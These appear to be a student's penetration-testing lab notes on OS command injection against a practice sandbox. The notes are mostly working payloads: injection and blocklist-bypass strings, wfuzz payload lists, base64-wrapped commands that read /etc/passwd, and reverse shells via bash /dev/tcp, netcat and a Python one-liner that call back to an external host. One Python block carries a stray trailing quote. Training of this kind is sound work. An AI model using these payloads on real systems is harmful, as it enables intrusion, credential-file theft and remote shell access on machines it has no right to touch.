#### Command Injection

In the case of Linux, we can use the semicolon (;), the logical AND (&&), the logical OR (||), and even a single pipe character (|).

```
ls -ls; id

```
We can also use && to chain commands. In this case the second command will only run if the first exits without error
A logical OR (||) will only run the second command if the first fails.

 Linux-specific inline execution1 mechanisms. Considers these examples, which use the backtick (`) character and the $() null statement to "wrap" a command ("cmd")

http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1;whoami

http://ci-sandbox/nodejs/index.js?ip=127.0.0.1|cat%20/var/tmp/exercise_chaining_flag.txt

#### Input Normalization

```
http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|bash -c 'bash -i >& /dev/tcp/192.168.49.51/9090 0>&1'

curl "http://ci-sandbox/nodejs/index.js?ip=127.0.0.1|bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.51/9090+0>%261'"

```
#### Input Sanitization - Blocklisted Strings Bypass

Command substitution:

echo "I am `whoami` here"

echo "I am $(whoami) here"

Substituted command get executed first. So you can use it to get a shell.
http://ci-sandbox/php/blocklisted.php?ip=127.0.0.1$(nc -nv 10.11.1.2 4444)  -> might need url encoding

A Null Statement Injection Bypass:

wh$()oami
n$()c -n$()lvp 9090

```

http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1;wh$()oami

```

#### Custom command list
```
bogus
;id
|id
`id`
i$()d
;i$()d
|i$()d
FAIL||i$()d
&&id
&id
FAIL_INTENT|id
FAIL_INTENT||id
`sleep 5`
`sleep 10`
`id`
$(sleep 5)
$(sleep 10)
$(id)
;`echo 'aWQK' |base64 -d`
FAIL_INTENT|`echo 'aWQK' |base64 -d`
FAIL_INTENT||`echo 'aWQK' |base64 -d`
```
Commands:

```
wfuzz -c -z file,/home/kali/command_injection_custom.txt --hc 404 http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1FUZZ

wfuzz -c -z file,/home/kali/command_injection_custom.txt --hc 404 --hh 1156 http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1FUZZ


```

```
echo "cat /etc/passwd" |base64

http://ci-sandbox/php/blocklisted.php?ip=127.0.0.1;`echo%20%22Y2F0IC9ldGMvcGFzc3dkCg==%22%20|base64%20-d`

```
might need to pass to bash or use $(cmd) for it to get executed.

echo "encoded string" | base64 -d | bash
$(echo "encoded string" | base64 -d)

#### Blind OS Command Injection Bypass

```
time curl http://ci-sandbox:80/php/blind.php?ip=127.0.0.1

time curl "http://ci-sandbox:80/php/blind.php?ip=127.0.0.1;sleep%2020"

```
1
(hacktricks.xyz, 2021), https://book.hacktricks.xyz/pentesting-web/unicode-normalization-vulnerability ↩︎

sol:
```

http://ci-sandbox/php/blocklisted.php?ip=127.0.0.1;`echo%20%22Y2F0IC9ldGMvcGFzc3dkCg==%22%20|base64%20-d`

http://ci-sandbox/php/blocklisted_exercise.php?ip=127.0.0.1$(id)
```
#### Enumerating Command Injection Capabilities

Linux:

|COMMAND	| USED FOR|
|---------------|---------|
wget	|File Transfer
curl	|File Transfer
fetch	|File Transfer
gcc	|Compilation
cc	|Compilation
nc	|Shells, File Transfer, Port Forwarding
socat	|Shells, File Transfer, Port Forwarding
ping	|Networking, Code Execution Verification
netstat	|Networking
ss	|Networking
ifconfig	|Networking
ip	|Networking
hostname	|Networking
php	|Shells, Code Execution
python	|Shells, Code Execution
python3	|Shells, Code Execution
perl	|Shells, Code Execution
java	|Shells, Code Execution

Windows:

|CAPABILITY	|USED FOR|
|-----------|--------|
Powershell	|Code Execution, Enumeration, Movement, Payload Delivery
Visual Basic	|Code Execution, Enumeration, Movement, Payload Delivery
tftp	|File Transfer
ftp	|File Transfer
certutil	|File Transfer
Python	|Code Execution, Enumeration
.NET	|Code Execution, Privilege Escalation, Payload Delivery
ipconfig	|Networking
netstat	|Networking
hostname	|Networking
systeminfo	|System Information, Patches, Versioning, Arch, etc.



capability_checks_custom.txt -> add "w00tw00t" as a baseline for a non-existent file
```
w00tw00t
wget
curl
fetch
gcc
cc
nc
socat
ping
netstat  
ss
ifconfig
ip
hostname
php
python
python3
perl
java
```
```
wfuzz -c -z file,/home/kali/capability_checks_custom.txt --hc 404 "http://ci-sandbox:80/php/index.php?ip=127.0.0.1;which FUZZ"
```

(PayloadAllTheThings, 2021), https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md ↩︎


#### Obtaining a Shell - Netcat

http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|id

```
http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|/bin/nc%20-nv%20192.168.49.51%209090%20-e%20/bin/bash
```
#### Obtaining a Shell - Python

Python rev shell one liner:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.51",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

The code:

```
import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.49.51",9090))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);'
```

Calling:

```
http://ci-sandbox/php/index.php?ip=127.0.0.1;python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.51%22,9090));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```
